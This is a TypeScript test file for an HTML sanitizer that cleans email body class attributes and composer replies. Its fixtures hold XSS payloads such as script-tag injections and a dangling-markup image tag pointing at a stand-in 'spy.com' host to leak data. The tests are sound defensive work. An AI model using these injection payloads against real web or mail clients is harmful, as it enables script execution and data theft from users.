import { protonizer, sanitizeComposerReply } from './purify';

describe('protonizer', () => {
    const getBodyClass = (doc: Element) => doc.querySelector('body')?.getAttribute('class');

    it('should preserve a normal body class attribute', () => {
        const html = '<html><body class="foo bar"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('foo bar');
    });

    it('should preserve body class when value contains script tags', () => {
        const html = '<html><body class="my-class <script>alert(1)</script> other-class"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyClass = getBodyClass(result);
        expect(bodyClass).not.toContain('<script>');
        expect(bodyClass).not.toContain('</script>');
        expect(bodyClass).toContain('my-class');
        expect(bodyClass).toContain('other-class');
    });

    it('should preserve body class when value contains closing script tag', () => {
        const html = '<html><body class="pre</script>post"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('pre post');
    });

    it('should preserve body class when value contains noscript tags', () => {
        const html = '<html><body class="cls</noscript>other"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('cls other');
    });

    it('should preserve body class when value contains iframe tags', () => {
        const html = '<html><body class="a</iframe>b"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('a b');
    });

    it('should preserve body class when value contains SGML delimiter -->', () => {
        const html = '<html><body class="a-->b"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBe('a b');
    });

    it('should strip double-encoded HTML entities that hide script tags', () => {
        const html =
            '<html><body class="cls &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; other"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyClass = getBodyClass(result);
        expect(bodyClass).not.toContain('<script>');
        expect(bodyClass).not.toContain('</script>');
        expect(bodyClass).toContain('cls');
        expect(bodyClass).toContain('other');
    });

    it('should strip script tags from class even when they are the only content', () => {
        const html = '<html><body class="<script>alert(1)</script>"><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        const bodyClass = getBodyClass(result);
        expect(bodyClass).not.toContain('<script>');
        expect(bodyClass).not.toContain('</script>');
    });

    it('should strip dangling markup with unclosed tags from body class', () => {
        const html = `<html><body class="class-pre &quot;&gt;&lt;img src='https://spy.com?whoami="><p>Hello</p></body></html>`;
        const result = protonizer(html, true);
        const bodyClass = getBodyClass(result);
        expect(bodyClass).not.toContain('img');
        expect(bodyClass).not.toContain('spy.com');
        expect(bodyClass).not.toContain('"');
        expect(bodyClass).not.toContain('>');
        expect(bodyClass).toContain('class-pre');
    });

    it('should handle body with no class attribute', () => {
        const html = '<html><body><p>Hello</p></body></html>';
        const result = protonizer(html, true);
        expect(getBodyClass(result)).toBeNull();
    });
});

describe('sanitizeComposerReply', () => {
    it('should remove all <style> tags from the input element', () => {
        const input = document.createElement('div');
        input.innerHTML = `
            <style>.example { color: red; }</style>
            <style>.example { color: red; }</style>
            <p>Test content</p>`;

        sanitizeComposerReply(input);

        expect(input.querySelector('style')).toBeNull();
        expect(input.querySelector('p')?.textContent).toBe('Test content');
    });

    it('should return the input element unchanged if there are no <style> tags', () => {
        const input = document.createElement('div');
        input.innerHTML = `<p>Test content</p>`;

        const result = sanitizeComposerReply(input);

        expect(result.querySelector('style')).toBeNull();
        expect(result.querySelector('p')?.textContent).toBe('Test content');
    });

    it('should return the input element as is if it is not queryable', () => {
        const input = document.createTextNode('Text node') as unknown as Element;

        const result = sanitizeComposerReply(input);

        expect(result).toBe(input);
    });

    it('should handle null input gracefully', () => {
        const result = sanitizeComposerReply(null as unknown as Element);

        expect(result).toBeNull();
    });
});
